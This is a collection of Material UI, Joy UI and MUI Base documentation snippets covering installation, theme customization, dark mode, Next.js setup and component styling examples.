TITLE: Installing Material UI with npm/pnpm/yarn
DESCRIPTION: Commands to install Material UI and its Emotion dependencies using different package managers.

LANGUAGE: bash
CODE:
npm install @mui/material@next @emotion/react @emotion/styled

LANGUAGE: bash
CODE:
pnpm add @mui/material@next @emotion/react @emotion/styled

LANGUAGE: bash
CODE:
yarn add @mui/material@next @emotion/react @emotion/styled

----------------------------------------

TITLE: Installing Joy UI Dependencies with Package Managers
DESCRIPTION: Commands to install Joy UI and its required Emotion dependencies using different package managers (npm, pnpm, yarn).

LANGUAGE: bash
CODE:
npm install @mui/joy @emotion/react @emotion/styled

LANGUAGE: bash
CODE:
pnpm add @mui/joy @emotion/react @emotion/styled

LANGUAGE: bash
CODE:
yarn add @mui/joy @emotion/react @emotion/styled

----------------------------------------

TITLE: Creating Custom Theme with Color Palette
DESCRIPTION: Demonstrates creating a custom theme with primary and secondary color palettes using createTheme function.

LANGUAGE: js
CODE:
import { createTheme } from '@mui/material/styles';
import { green, purple } from '@mui/material/colors';

const theme = createTheme({
  palette: {
    primary: {
      main: purple[500],
    },
    secondary: {
      main: green[500],
    },
  },
});

----------------------------------------

TITLE: Controlling Menu Open State in React
DESCRIPTION: This snippet shows how to control the open/close state of a menu programmatically from outside the Dropdown component. It uses the 'open' and 'onOpenChange' props of the Dropdown component.

LANGUAGE: jsx
CODE:
<Dropdown open={open} onOpenChange={handleOpenChange}>
  {/* Menu components */}
</Dropdown>

----------------------------------------

TITLE: Basic Tree-Shaking Import Example
DESCRIPTION: Demonstrates the standard named import syntax that supports tree-shaking in modern bundlers.

LANGUAGE: javascript
CODE:
import { Button, TextField } from '@mui/material';

----------------------------------------

TITLE: Creating Custom Color Theme in Material UI
DESCRIPTION: This snippet demonstrates how to create a custom color theme using the createTheme function from Material UI. It defines primary and secondary color palettes with light, main, dark, and contrastText variants.

LANGUAGE: js
CODE:
import { createTheme } from '@mui/material/styles';

const theme = createTheme({
  palette: {
    primary: {
      light: '#757ce8',
      main: '#3f50b5',
      dark: '#002884',
      contrastText: '#fff',
    },
    secondary: {
      light: '#ff7961',
      main: '#f44336',
      dark: '#ba000d',
      contrastText: '#000',
    },
  },
});

----------------------------------------

TITLE: Implementing Keyboard Navigation in React with MUI Base
DESCRIPTION: Demonstrates how to implement keyboard navigation in a MUI Base component. The code shows a Select component that can be navigated using various keyboard keys.

LANGUAGE: jsx
CODE:
{"demo": "KeyboardNavigation.js", "defaultCodeOpen": false}

----------------------------------------

TITLE: Installing Material UI dependencies for Next.js
DESCRIPTION: Commands for installing necessary dependencies to use Material UI with Next.js App Router.

LANGUAGE: bash
CODE:
npm install @mui/material-nextjs @emotion/cache

LANGUAGE: bash
CODE:
pnpm add @mui/material-nextjs @emotion/cache

LANGUAGE: bash
CODE:
yarn add @mui/material-nextjs @emotion/cache

----------------------------------------

TITLE: Styling MUI Base Switch Component with Emotion
DESCRIPTION: This snippet demonstrates how to style a MUI Base Switch component using Emotion, a CSS-in-JS library. It creates styled subcomponents for the root, thumb, input, and track parts of the Switch.

LANGUAGE: jsx
CODE:
import * as React from 'react';
import { Switch } from '@mui/base/Switch';
import { styled } from '@mui/system';

const StyledSwitch = styled(Switch)`
  font-size: 0;
  position: relative;
  display: inline-block;
  width: 32px;
  height: 20px;
  cursor: pointer;
  background: #b3c3d3;
  border-radius: 9999px;
  margin: 10px;
  transition: all 150ms;

  & .base-Switch-thumb {
    display: block;
    width: 14px;
    height: 14px;
    top: 3px;
    left: 3px;
    border-radius: 16px;
    background-color: #fff;
    position: relative;
    transition: all 200ms;
  }

  & .base-Switch-input {
    cursor: inherit;
    position: absolute;
    width: 100%;
    height: 100%;
    top: 0;
    left: 0;
    opacity: 0;
    z-index: 1;
    margin: 0;
  }

  &:hover {
    background: #8796a5;
  }

  &.base-Switch-disabled {
    opacity: 0.4;
    cursor: not-allowed;
  }

  &.base-Switch-checked {
    background: #007fff;

    & .base-Switch-thumb {
      left: 14px;
      top: 3px;
      background-color: #fff;
    }

    &:hover {
      background: #0059b2;
    }
  }
`;

export default function StylingSlotsSingleComponent() {
  return <StyledSwitch defaultChecked />;
}

----------------------------------------

TITLE: Implementing Theme Registry for Joy UI with Next.js App Router
DESCRIPTION: Creates a custom ThemeRegistry component that combines Emotion's CacheProvider with Joy UI's CssVarsProvider for Next.js App Router integration. Handles server-side style injection using useServerInsertedHTML and implements emotion cache management.

LANGUAGE: tsx
CODE:
'use client';
import createCache from '@emotion/cache';
import { useServerInsertedHTML } from 'next/navigation';
import { CacheProvider } from '@emotion/react';
import { CssVarsProvider } from '@mui/joy/styles';
import CssBaseline from '@mui/joy/CssBaseline';
import theme from '/path/to/custom/theme'; // OPTIONAL

export default function ThemeRegistry(props) {
  const { options, children } = props;

  const [{ cache, flush }] = React.useState(() => {
    const cache = createCache(options);
    cache.compat = true;
    const prevInsert = cache.insert;
    let inserted: string[] = [];
    cache.insert = (...args) => {
      const serialized = args[1];
      if (cache.inserted[serialized.name] === undefined) {
        inserted.push(serialized.name);
      }
      return prevInsert(...args);
    };
    const flush = () => {
      const prevInserted = inserted;
      inserted = [];
      return prevInserted;
    };
    return { cache, flush };
  });

  useServerInsertedHTML(() => {
    const names = flush();
    if (names.length === 0) {
      return null;
    }
    let styles = '';
    for (const name of names) {
      styles += cache.inserted[name];
    }
    return (
      <style
        key={cache.key}
        data-emotion={`${cache.key} ${names.join(' ')}`}
        dangerouslySetInnerHTML={{
          __html: styles,
        }}
      />
    );
  });

  return (
    <CacheProvider value={cache}>
      <CssVarsProvider theme={theme}>
        <CssBaseline />
        {children}
      </CssVarsProvider>
    </CacheProvider>
  );
}

----------------------------------------

TITLE: Implementing Style Overrides in Material UI Theme
DESCRIPTION: Shows how to override default styles of Material UI components using the styleOverrides key in theme configuration. This example modifies the font size of all Button components.

LANGUAGE: javascript
CODE:
const theme = createTheme({
  components: {
    // Name of the component
    MuiButton: {
      styleOverrides: {
        // Name of the slot
        root: {
          // Some CSS
          fontSize: '1rem',
        },
      },
    },
  },
});

----------------------------------------

TITLE: Applying Different Styles per Color Scheme in Joy UI
DESCRIPTION: Demonstrates how to apply different styles for light and dark color schemes using the theme.getColorSchemeSelector utility.

LANGUAGE: javascript
CODE:
extendTheme({
  components: {
    JoyChip: {
      styleOverrides: {
        root: ({ ownerState, theme }) => ({
          boxShadow: theme.vars.shadow.sm,

          [theme.getColorSchemeSelector('dark')]: {
            boxShadow: 'none',
          },
        }),
      },
    },
  },
});

----------------------------------------

TITLE: Customizing Theme Tokens with Joy UI
DESCRIPTION: Demonstrates how to customize theme tokens using the extendTheme function to modify color schemes and font families. The customized tokens are deeply merged into the default theme and converted to CSS variables.

LANGUAGE: JavaScript
CODE:
import { CssVarsProvider, extendTheme } from '@mui/joy/styles';

const theme = extendTheme({
  colorSchemes: {
    light: {
      palette: {
        // affects all Joy components that has `color="primary"` prop.
        primary: {
          50: '#fffbeb',
          100: '#fef3c7',
          200: '#fde68a',
          // 300, 400, ..., 800,
          900: '#78350f',
        },
      },
    },
  },
  fontFamily: {
    display: 'Inter, var(--joy-fontFamily-fallback)',
    body: 'Inter, var(--joy-fontFamily-fallback)',
  },
});

function App() {
  return <CssVarsProvider theme={theme}>...</CssVarsProvider>;
}

----------------------------------------

TITLE: Creating Custom Switch Component with useSwitch Hook
DESCRIPTION: This example shows how to create a fully custom Switch component using the useSwitch hook from MUI Base. It demonstrates how to handle the component's state and accessibility props.

LANGUAGE: jsx
CODE:
import * as React from 'react';
import { useSwitch } from '@mui/base/useSwitch';
import { styled } from '@mui/system';

const BasicSwitch = styled('span')`
  font-size: 0;
  position: relative;
  display: inline-block;
  width: 32px;
  height: 20px;
  background: #B3C3D3;
  border-radius: 10px;
  margin: 10px;
  cursor: pointer;

  &.Switch-disabled {
    opacity: 0.4;
    cursor: not-allowed;
  }

  &.Switch-checked {
    background: #007FFF;
  }
`;

const Thumb = styled('span')`
  display: block;
  width: 14px;
  height: 14px;
  top: 3px;
  left: 3px;
  border-radius: 16px;
  background-color: #FFF;
  position: relative;
  transition: all 200ms ease;

  .Switch-checked & {
    left: 14px;
    top: 3px;
    background-color: #FFF;
  }
`;

export default function StylingHooks() {
  const { getInputProps, checked, disabled, focusVisible } = useSwitch();

  const stateClasses = {
    'Switch-checked': checked,
    'Switch-disabled': disabled,
    'Switch-focusVisible': focusVisible,
  };

  return (
    <BasicSwitch className={Object.entries(stateClasses)
      .filter(([, v]) => v)
      .map(([cls]) => cls)
      .join(' ')}>
      <Thumb />
      <input {...getInputProps()} aria-hidden={true} />
    </BasicSwitch>
  );
}

----------------------------------------

TITLE: Creating Custom Variants in Material UI Theme
DESCRIPTION: Demonstrates how to create and style custom variants for Material UI components. Includes examples of modifying existing variants and creating new ones with TypeScript support.

LANGUAGE: javascript
CODE:
const theme = createTheme({
  components: {
    MuiButton: {
      styleOverrides: {
        root: {
          variants: [
            {
              props: { variant: 'dashed', color: 'secondary' },
              style: {
                border: `4px dashed ${red[500]}`,
              },
            },
          ],
        },
      },
    },
  },
});

LANGUAGE: typescript
CODE:
declare module '@mui/material/Button' {
  interface ButtonPropsVariantOverrides {
    dashed: true;
  }
}

----------------------------------------

TITLE: Handling Button Clicks in React
DESCRIPTION: Demonstrates how to handle click events on a Button component using the onClick prop. The example shows an alert being triggered when the button is clicked.

LANGUAGE: jsx
CODE:
<Button
  onClick={() => {
    alert('clicked');
  }}
>
  Click me
</Button>

----------------------------------------

TITLE: Handling Button Clicks in React
DESCRIPTION: Demonstrates how to handle click events on a Button component using the onClick prop. The example shows an alert being triggered when the button is clicked.

LANGUAGE: jsx
CODE:
<Button
  onClick={() => {
    alert('clicked');
  }}
>
  Click me
</Button>

----------------------------------------

TITLE: Implementing Dark Mode in Next.js App Router with Joy UI
DESCRIPTION: This snippet demonstrates how to set up dark mode in a Next.js project using the App Router. It shows the use of InitColorSchemeScript, CssVarsProvider, and CssBaseline in the root layout file to prevent flickering and enable dark mode.

LANGUAGE: jsx
CODE:
import InitColorSchemeScript from '@mui/joy/InitColorSchemeScript';
import { CssVarsProvider } from '@mui/joy/styles';
import CssBaseline from '@mui/joy/CssBaseline';

export default function RootLayout(props) {
  return (
    <html lang="en" suppressHydrationWarning={true}>
      <body>
        <InitColorSchemeScript />
        <CssVarsProvider>
          <CssBaseline />
          {props.children}
        </CssVarsProvider>
      </body>
    </html>
  );
}

----------------------------------------

TITLE: Configuring Joy UI and Material UI Providers in React
DESCRIPTION: Sets up the necessary providers to use Joy UI and Material UI together. Uses ThemeProvider from Material UI as the outer wrapper and CssVarsProvider from Joy UI as the inner provider with proper theme separation.

LANGUAGE: javascript
CODE:
import {
  createTheme,
  ThemeProvider,
  THEME_ID as MATERIAL_THEME_ID,
} from '@mui/material/styles';
import { CssVarsProvider as JoyCssVarsProvider } from '@mui/joy/styles';
import CssBaseline from '@mui/material/CssBaseline';

const materialTheme = createTheme();

export default function App() {
  return (
    <ThemeProvider theme={{ [MATERIAL_THEME_ID]: materialTheme }}>
      <JoyCssVarsProvider>
        <CssBaseline enableColorScheme />
        ...Material UI and Joy UI components
      </JoyCssVarsProvider>
    </ThemeProvider>
  );
}

----------------------------------------

TITLE: Setting Responsive Meta Tag for Material UI
DESCRIPTION: HTML meta tag configuration required for proper mobile-first rendering and touch zooming across all devices when using Material UI components.

LANGUAGE: html
CODE:
<meta name="viewport" content="initial-scale=1, width=device-width" />

----------------------------------------

TITLE: Setting Up Dark Mode with ThemeProvider in Material UI
DESCRIPTION: Creates and applies a dark theme using Material UI's ThemeProvider and CssBaseline components. This demonstrates the basic setup for enabling dark mode application-wide.

LANGUAGE: js
CODE:
import { ThemeProvider, createTheme } from '@mui/material/styles';
import CssBaseline from '@mui/material/CssBaseline';

const darkTheme = createTheme({
  palette: {
    mode: 'dark',
  },
});

export default function App() {
  return (
    <ThemeProvider theme={darkTheme}>
      <CssBaseline />
      <main>This app is using the dark mode</main>
    </ThemeProvider>
  );
}

----------------------------------------

TITLE: Customizing CSS Variable Prefix in Material UI
DESCRIPTION: Demonstrates how to change the default CSS variable prefix in Material UI using the createTheme function. It shows examples of setting a custom prefix and removing the prefix entirely.

LANGUAGE: javascript
CODE:
createTheme({ cssVariables: { cssVarPrefix: 'any' } });

// generated stylesheet:
// --any-palette-primary-main: ...;

LANGUAGE: javascript
CODE:
createTheme({ cssVariables: { cssVarPrefix: '' } });

// generated stylesheet:
// --palette-primary-main: ...;

----------------------------------------

TITLE: Creating Custom Theme Variables in Material UI
DESCRIPTION: Example of adding custom variables to Material UI theme using createTheme function. Shows how to extend the theme with custom status indicators.

LANGUAGE: jsx
CODE:
const theme = createTheme({
  status: {
    danger: orange[500],
  },
});

----------------------------------------

TITLE: Demonstrating sx Prop Usage in Material UI v5 with React
DESCRIPTION: This code snippet illustrates how to use the new sx prop in Material UI v5 for applying custom styles to a Box component. It showcases the ability to work with a superset of CSS, including responsive styles and pseudo-selectors.

LANGUAGE: tsx
CODE:
import * as React from 'react';
import Box from '@mui/material/Box';

export default function BoxSx() {
  return (
    <Box
      sx={{
        width: 300,
        height: 300,
        backgroundColor: 'primary.dark',
        '&:hover': {
          backgroundColor: 'primary.main',
          opacity: [0.9, 0.8, 0.7],
        },
      }}
    />
  );
}

----------------------------------------

TITLE: Adding Accessibility Attributes to React Modal
DESCRIPTION: Demonstrates how to add proper accessibility attributes to the Modal component, including aria-labelledby and aria-describedby for screen readers.

LANGUAGE: JSX
CODE:
<Modal aria-labelledby="modal-title" aria-describedby="modal-description">
  <h2 id="modal-title">My Title</h2>
  <p id="modal-description">My Description</p>
</Modal>

----------------------------------------

TITLE: TypeScript Theme Augmentation in Material UI
DESCRIPTION: Demonstrates how to extend Material UI theme types in TypeScript using module augmentation to add custom theme variables.

LANGUAGE: tsx
CODE:
declare module '@mui/material/styles' {
  interface Theme {
    status: {
      danger: string;
    };
  }
  interface ThemeOptions {
    status?: {
      danger?: string;
    };
  }
}

----------------------------------------

TITLE: Adding Material Icons Font via Google Web Fonts CDN
DESCRIPTION: HTML code to include the Material Icons font in a project using the Google Web Fonts CDN.

LANGUAGE: html
CODE:
<link
  rel="stylesheet"
  href="https://fonts.googleapis.com/icon?family=Material+Icons"
/>

----------------------------------------

TITLE: Cloning and Setting Up Repository for Material UI
DESCRIPTION: Commands to clone the Material UI repository, add the upstream remote, and install dependencies using pnpm.

LANGUAGE: bash
CODE:
git clone https://github.com/<your username>/material-ui.git
cd material-ui
git remote add upstream https://github.com/mui/material-ui.git
pnpm install

----------------------------------------

TITLE: Adding Button and Link Components
DESCRIPTION: Implementation of action elements including a login button and sign-up link with custom styling.

LANGUAGE: jsx
CODE:
<Button sx={{ mt: 1 /* margin top */ }}>
  Log in
</Button>
<Typography
  endDecorator={<Link href="/sign-up">Sign up</Link>}
  fontSize="sm"
  sx={{ alignSelf: 'center' }}
>
  Don't have an account?
</Typography>

----------------------------------------

TITLE: Creating a Performance-Optimized Option Component
DESCRIPTION: Example of creating a StableOption component using useOptionContextStabilizer for improved performance with many options.

LANGUAGE: tsx
CODE:
const StableOption = React.forwardRef(function StableOption<OptionValue>(
  props: OptionProps<OptionValue>,
  ref: React.ForwardedRef<Element>,
) {
  const { contextValue } = useOptionContextStabilizer(props.value);

  return (
    <ListContext.Provider value={contextValue}>
      <Option {...props} ref={ref} />
    </ListContext.Provider>
  );
});

----------------------------------------

TITLE: Creating Styled Component Slots in Material UI
DESCRIPTION: Demonstrates how to create styled component slots using the styled API with name and slot parameters. This allows for customization of individual elements through the theme.

LANGUAGE: javascript
CODE:
import * as React from 'react';
import { styled } from '@mui/material/styles';

const StatRoot = styled('div', {
  name: 'MuiStat', // The component name
  slot: 'root', // The slot name
})(({ theme }) => ({
  display: 'flex',
  flexDirection: 'column',
  gap: theme.spacing(0.5),
  padding: theme.spacing(3, 4),
  backgroundColor: theme.palette.background.paper,
  borderRadius: theme.shape.borderRadius,
  boxShadow: theme.shadows[2],
  letterSpacing: '-0.025em',
  fontWeight: 600,
}));

const StatValue = styled('div', {
  name: 'MuiStat',
  slot: 'value',
})(({ theme }) => ({
  ...theme.typography.h3,
}));

const StatUnit = styled('div', {
  name: 'MuiStat',
  slot: 'unit',
})(({ theme }) => ({
  ...theme.typography.body2,
  color: theme.palette.text.secondary,
}));

----------------------------------------

TITLE: Basic ButtonGroup Implementation in React
DESCRIPTION: Demonstrates how to group related buttons using the ButtonGroup component. Buttons must be immediate children of ButtonGroup.

LANGUAGE: jsx
CODE:
<ButtonGroup>\n  <Button>One</Button>\n  <Button>Two</Button>\n  <Button>Three</Button>\n</ButtonGroup>

----------------------------------------

TITLE: Disabling Transitions on Color Scheme Change in Material UI
DESCRIPTION: Shows how to disable CSS transitions when switching between color schemes in Material UI by applying the disableTransitionOnChange prop to the ThemeProvider component.

LANGUAGE: javascript
CODE:
<ThemeProvider disableTransitionOnChange />

----------------------------------------

TITLE: Customizing Switch Component with CSS Modules in TypeScript
DESCRIPTION: This snippet demonstrates how to customize a Switch component using CSS Modules in TypeScript. It uses the clsx utility to conditionally apply class names based on the component's state.

LANGUAGE: tsx
CODE:
import clsx from 'clsx';
import { Switch as BaseSwitch, SwitchOwnerState } from '@mui/base/Switch';
import classes from './styles.module.css';

export default function Switch(props) {
  const slotProps = {
    root: (ownerState: SwitchOwnerState) => ({
      className: clsx(classes.root, {
        [classes.checked]: ownerState.checked,
        [classes.disabled]: ownerState.disabled,
      }),
    }),
    thumb: { className: classes.thumb },
    track: { className: classes.track },
    input: { className: classes.input },
  };

  return <BaseSwitch {...props} slotProps={slotProps} />;
}

----------------------------------------

TITLE: Styling Material UI Component with ownerState
DESCRIPTION: Demonstrates how to use ownerState to style a component based on props or internal state. This example adds a variant prop to the Stat component.

LANGUAGE: javascript
CODE:
const Stat = React.forwardRef(function Stat(props, ref) {
  const { value, unit, variant, ...other } = props;

  const ownerState = { ...props, variant };

  return (
    <StatRoot ref={ref} ownerState={ownerState} {...other}>
      <StatValue ownerState={ownerState}>{value}</StatValue>
      <StatUnit ownerState={ownerState}>{unit}</StatUnit>
    </StatRoot>
  );
});

----------------------------------------

TITLE: Implementing Server-Side Rendering with Joy UI Dark Mode
DESCRIPTION: This snippet demonstrates how to implement server-side rendering with Joy UI's dark mode, avoiding hydration mismatches. It uses a useEffect hook to render the UI only after the component has mounted on the client side.

LANGUAGE: javascript
CODE:
function ModeToggle() {
  const { mode, setMode } = useColorScheme();
  const [mounted, setMounted] = React.useState(false);

  React.useEffect(() => {
    setMounted(true);
  }, []);

  if (!mounted) {
    // to avoid layout shift, render a placeholder button
    return <Button variant="outlined" color="neutral" sx={{ width: 120 }} />;
  }

  return (
    <Button
      variant="outlined"
      color="neutral"
      onClick={() => setMode(mode === 'dark' ? 'light' : 'dark')}
    >
      {mode === 'dark' ? 'Turn light' : 'Turn dark'}
    </Button>
  );
};

----------------------------------------

TITLE: Defining Primary Color Tokens in JavaScript
DESCRIPTION: This snippet demonstrates how to define the primary color tokens (main, light, dark, and contrastText) in the default Material UI theme.

LANGUAGE: javascript
CODE:
const primary = {
  main: '#1976d2',
  light: '#42a5f5',
  dark: '#1565c0',
  contrastText: '#fff',
};

----------------------------------------

TITLE: Basic Menu Implementation in React
DESCRIPTION: Demonstrates a basic menu that opens over an anchor element. The menu automatically realigns when near screen edges and closes upon option selection.

LANGUAGE: jsx
CODE:
{"demo": "BasicMenu.js"}

----------------------------------------

TITLE: Customizing Palette Colors Using Color Objects in JavaScript
DESCRIPTION: This example shows how to customize palette colors by importing and applying color objects from Material UI.

LANGUAGE: javascript
CODE:
import { createTheme } from '@mui/material/styles';
import { purple } from '@mui/material/colors';

const theme = createTheme({
  palette: {
    primary: purple,
  },
});

----------------------------------------

TITLE: Creating Custom Named Breakpoints in Material UI
DESCRIPTION: This snippet demonstrates how to create custom named breakpoints in the Material UI theme. It defines breakpoints for mobile, tablet, laptop, and desktop screens.

LANGUAGE: js
CODE:
const theme = createTheme({
  breakpoints: {
    values: {
      mobile: 0,
      tablet: 640,
      laptop: 1024,
      desktop: 1200,
    },
  },
});

----------------------------------------

TITLE: Installing MUI Base Package
DESCRIPTION: Commands to install @mui/base package using different package managers

LANGUAGE: bash
CODE:
npm install @mui/base

LANGUAGE: bash
CODE:
pnpm add @mui/base

LANGUAGE: bash
CODE:
yarn add @mui/base

----------------------------------------

TITLE: Creating Container Queries with Material UI Theme
DESCRIPTION: Demonstrates how to use theme.containerQueries to create CSS container queries based on theme breakpoints. The example shows how to use the 'up' method with a breakpoint key.

LANGUAGE: javascript
CODE:
theme.containerQueries.up('sm'); // => '@container (min-width: 600px)'

----------------------------------------

TITLE: Customizing Joy UI Component Styles
DESCRIPTION: Shows how to customize specific component styles globally through theme configuration using the extendTheme function. The example modifies the Button component's font size.

LANGUAGE: JavaScript
CODE:
import { CssVarsProvider, extendTheme } from '@mui/joy/styles';
import Button from '@mui/joy/Button';

const theme = extendTheme({
  components: {
    // The component identifier always start with `Joy${ComponentName}`.
    JoyButton: {
      styleOverrides: {
        root: ({ theme }) => {
          // theme.vars.* return the CSS variables.
          fontSize: theme.vars.fontSize.lg, // 'var(--joy-fontSize-lg)'
        },
      },
    },
  },
});

function MyApp() {
  return (
    <CssVarsProvider theme={theme}>
      <Button>Text</Button>
    </CssVarsProvider>
  );
}

----------------------------------------

TITLE: Configuring High-Density Theme for Material UI Components in JavaScript
DESCRIPTION: This code snippet demonstrates how to create a custom theme with high-density settings for various Material UI components. It sets default props for components to use smaller sizes or dense variants, which results in a more compact UI.

LANGUAGE: javascript
CODE:
const theme = createTheme({
  components: {
    MuiButton: {
      defaultProps: {
        size: 'small',
      },
    },
    MuiFilledInput: {
      defaultProps: {
        margin: 'dense',
      },
    },
    MuiFormControl: {
      defaultProps: {
        margin: 'dense',
      },
    },
    MuiFormHelperText: {
      defaultProps: {
        margin: 'dense',
      },
    },
    MuiIconButton: {
      defaultProps: {
        size: 'small',
      },
    },
    MuiInputBase: {
      defaultProps: {
        margin: 'dense',
      },
    },
    MuiInputLabel: {
      defaultProps: {
        margin: 'dense',
      },
    },
    MuiListItem: {
      defaultProps: {
        dense: true,
      },
    },
    MuiOutlinedInput: {
      defaultProps: {
        margin: 'dense',
      },
    },
    MuiFab: {
      defaultProps: {
        size: 'small',
      },
    },
    MuiTable: {
      defaultProps: {
        size: 'small',
      },
    },
    MuiTextField: {
      defaultProps: {
        margin: 'dense',
      },
    },
    MuiToolbar: {
      defaultProps: {
        variant: 'dense',
      },
    },
  },
});

----------------------------------------

TITLE: Extending Component Variants in Joy UI Theme
DESCRIPTION: Shows how to add a custom variant to a Joy UI component and use TypeScript module augmentation for type safety.

LANGUAGE: javascript
CODE:
extendTheme({
  components: {
    JoySheet: {
      styleOverrides: {
        root: ({ ownerState, theme }) => ({
          ...(ownerState.variant === 'glass' && {
            color: theme.vars.palette.text.primary,
            background: 'rgba(255, 255, 255, 0.14)',
            backdropFilter: 'blur(5px)',
            border: '1px solid rgba(255, 255, 255, 0.3)',
            boxShadow: '0 4px 30px rgba(0, 0, 0, 0.1)',
          }),
        }),
      },
    },
  },
});

LANGUAGE: typescript
CODE:
declare module '@mui/joy/Sheet' {
  interface SheetPropsVariantOverrides {
    glass: true;
  }
}

----------------------------------------

TITLE: Adding Roboto Font via Google Web Fonts CDN
DESCRIPTION: HTML code to include the Roboto font in a project using the Google Web Fonts CDN.

LANGUAGE: html
CODE:
<link rel="preconnect" href="https://fonts.googleapis.com" />
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
<link
  rel="stylesheet"
  href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap"
/>

----------------------------------------

TITLE: Accessing Theme in React Components
DESCRIPTION: Shows how to access theme variables in functional React components using the useTheme hook.

LANGUAGE: jsx
CODE:
import { useTheme } from '@mui/material/styles';

function DeepChild() {
  const theme = useTheme();
  return <span>{`spacing ${theme.spacing}`}</span>;
}

----------------------------------------

TITLE: Asynchronous Autocomplete Loading in React
DESCRIPTION: Shows how to implement asynchronous loading of options in the Autocomplete component with a progress indicator.

LANGUAGE: jsx
CODE:
export default function Asynchronous() {
  const [open, setOpen] = React.useState(false);
  const [options, setOptions] = React.useState([]);
  const loading = open && options.length === 0;

  React.useEffect(() => {
    let active = true;

    if (!loading) {
      return undefined;
    }

    (async () => {
      await sleep(1e3); // For demo purposes.

      if (active) {
        setOptions([...topFilms]);
      }
    })();

    return () => {
      active = false;
    };
  }, [loading]);

  React.useEffect(() => {
    if (!open) {
      setOptions([]);
    }
  }, [open]);

  return (
    <Autocomplete
      open={open}
      onOpen={() => {
        setOpen(true);
      }}
      onClose={() => {
        setOpen(false);
      }}
      isOptionEqualToValue={(option, value) => option.title === value.title}
      getOptionLabel={(option) => option.title}
      options={options}
      loading={loading}
      sx={{ width: 300 }}
      endDecorator={loading ? <AutocompleteDecorator><CircularProgress size="sm" /></AutocompleteDecorator> : null}
    />
  );
}

----------------------------------------

TITLE: Generating Color Tokens Using augmentColor Utility in JavaScript
DESCRIPTION: This snippet demonstrates how to use the augmentColor utility to generate light, dark, and contrastText tokens based on a main color.

LANGUAGE: javascript
CODE:
import { createTheme } from '@mui/material/styles';

let theme = createTheme({
  // Theme customization goes here as usual, including tonalOffset and/or
  // contrastThreshold as the augmentColor() function relies on these
});

theme = createTheme(theme, {
  // Custom colors created with augmentColor go here
  palette: {
    salmon: theme.palette.augmentColor({
      color: {
        main: '#FF5733',
      },
      name: 'salmon',
    }),
  },
});

----------------------------------------

TITLE: Configuring CSS Theme Variables
DESCRIPTION: Example of enabling CSS variables generation from theme configuration using ThemeProvider.

LANGUAGE: jsx
CODE:
const theme = createTheme({
  cssVariables: true,
});

function App() {
  return <ThemeProvider theme={theme}>...</ThemeProvider>;
}

----------------------------------------

TITLE: Customizing Button Cursor for Disabled State
DESCRIPTION: Shows how to customize the cursor style for disabled buttons using CSS. This example removes the pointer-events: none style and sets the cursor to not-allowed.

LANGUAGE: css
CODE:
.MuiButtonBase-root:disabled {
  cursor: not-allowed;
  pointer-events: auto;
}

----------------------------------------

TITLE: Implementing Basic Links in Material-UI
DESCRIPTION: Demonstrates basic usage of the Link component built on top of Typography with default props color="primary" and variant="inherit".

LANGUAGE: JSX
CODE:
{"demo": "Links.js"}

----------------------------------------

TITLE: Accessible Form Control Implementation in Joy UI
DESCRIPTION: Shows how Joy UI's Form Control component automatically generates unique IDs to link Input components with Form Labels and Helper Text for accessibility compliance.

LANGUAGE: jsx
CODE:
{{"demo": "../../components/input/InputField.js"}}

----------------------------------------

TITLE: Synchronizing Color Mode Between Joy UI and Material UI
DESCRIPTION: Implements a color mode toggle that synchronizes dark/light mode between Joy UI and Material UI using their respective hooks and state management.

LANGUAGE: javascript
CODE:
import { useColorScheme as useJoyColorScheme } from '@mui/joy/styles';
import { useColorScheme as useMaterialColorScheme } from '@mui/material/styles';

const ModeToggle = () => {
  const { mode, setMode: setMaterialMode } = useMaterialColorScheme();
  const { setMode: setJoyMode } = useJoyColorScheme();
  const [mounted, setMounted] = React.useState(false);
  React.useEffect(() => {
    setMounted(true);
  }, []);
  if (!mounted) {
    return null;
  }
  return (
    <IconButton
      onClick={() => {
        setMaterialMode(mode === 'dark' ? 'light' : 'dark');
        setJoyMode(mode === 'dark' ? 'light' : 'dark');
      }}
    >
      {mode === 'dark' ? <DarkMode /> : <LightMode />}
    </IconButton>
  );
};

----------------------------------------

TITLE: Implementing Fixed App Bar with Content Offset in React
DESCRIPTION: This snippet demonstrates how to implement a fixed App Bar with a content offset to prevent content from being hidden behind the bar. It shows three different approaches: using position='sticky', rendering a second Toolbar, or using theme.mixins.toolbar CSS.

LANGUAGE: jsx
CODE:
function App() {
  return (
    <React.Fragment>
      <AppBar position="fixed">
        <Toolbar>{/* content */}</Toolbar>
      </AppBar>
      <Toolbar />
    </React.Fragment>
  );
}

LANGUAGE: jsx
CODE:
const Offset = styled('div')(({ theme }) => theme.mixins.toolbar);

function App() {
  return (
    <React.Fragment>
      <AppBar position="fixed">
        <Toolbar>{/* content */}</Toolbar>
      </AppBar>
      <Offset />
    </React.Fragment>
  );
}

----------------------------------------

TITLE: Configuring Default Props in Material UI Theme
DESCRIPTION: Example showing how to modify default props for Material UI components using the theme's components key. This snippet demonstrates disabling ripple effect globally for ButtonBase component.

LANGUAGE: javascript
CODE:
const theme = createTheme({
  components: {
    // Name of the component
    MuiButtonBase: {
      defaultProps: {
        // The props to change the default for.
        disableRipple: true, // No more ripple, on the whole application 💣!
      },
    },
  },
});

----------------------------------------

TITLE: Basic Grid Layout in React
DESCRIPTION: Demonstrates how to create a basic grid layout using the Grid component from MUI. It shows the usage of the container prop and how to specify column widths using the size prop.

LANGUAGE: JavaScript
CODE:
{"demo": "BasicGrid.js", "bg": true}

----------------------------------------

TITLE: Configuring Manual Dark Mode Toggle in Material UI
DESCRIPTION: Shows how to set up manual dark mode toggling using the colorSchemeSelector property in Material UI. It includes examples for class-based, data-attribute-based, and custom string-based selectors.

LANGUAGE: javascript
CODE:
createTheme({
  colorSchemes: { light: true, dark: true },
  cssVariables: {
    colorSchemeSelector: 'class'
  }
});

// CSS Result
.light { ... }
.dark { ... }

LANGUAGE: javascript
CODE:
createTheme({
  colorSchemes: { light: true, dark: true },
  cssVariables: {
    colorSchemeSelector: 'data'
  }
});

// CSS Result
[data-light] { ... }
[data-dark] { ... }

LANGUAGE: javascript
CODE:
// The value must start with dot (.) for class or square brackets ([]) for data
createTheme({
  colorSchemes: { light: true, dark: true },
  cssVariables: {
    colorSchemeSelector: '.theme-%s'
  }
});

// CSS Result
.theme-light { ... }
.theme-dark { ... }

----------------------------------------

TITLE: Assembling Joy UI Component with Slots
DESCRIPTION: Shows how to combine styled slots into a complete React component with proper prop handling and ref forwarding

